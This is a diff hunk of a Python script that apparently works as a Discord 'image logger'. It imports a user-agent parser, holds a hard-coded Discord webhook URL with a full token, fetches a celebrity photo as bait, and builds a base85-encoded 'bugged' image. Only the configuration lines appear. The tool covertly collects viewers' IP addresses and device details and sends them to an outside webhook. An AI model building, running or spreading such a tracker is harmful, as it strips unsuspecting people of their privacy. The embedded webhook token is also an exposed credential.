@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1559315092594630798/yhnQBuFl52mEqp68sUIant-D9AMr2QwypBGHKanjP5DOhTwn2Tby7ohP7oSwjY07Yc5X'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://media.gettyimages.com/id/84766737/photo/los-angeles-ca-actor-sean-p-diddy-combs-poses-for-a-portrait-during-the-40th-naacp-image-awards.jpg?s=612x612&w=gi&k=20&c=UpqRAhRnD8vjqUdqftNp1dESyGG8dbdd2i-oLYOtpXI=').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
